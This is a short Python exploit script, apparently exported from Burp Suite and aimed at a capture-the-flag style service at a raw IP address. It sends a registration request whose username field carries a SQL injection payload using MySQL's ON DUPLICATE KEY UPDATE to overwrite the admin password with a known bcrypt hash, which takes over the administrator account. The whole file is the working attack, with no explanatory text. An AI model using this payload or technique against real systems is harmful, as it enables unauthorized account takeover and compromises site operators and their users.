
import requests

burp0_url = "http://167.71.138.188:30836/api/register"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://167.71.138.188:30836", "Referer": "http://167.71.138.188:30836/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_json={"password": "admin", "username": "admin\",\"xxx\") ON DUPLICATE KEY UPDATE password=\"$2b$12$YlSYPd1.j0jSi1ENR5iw7uN2FVkwMPD4IY8g/icNdIdn69M03V0GO\"-- -"}
requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

# https://dev.mysql.com/doc/refman/5.7/en/insert-on-duplicate.html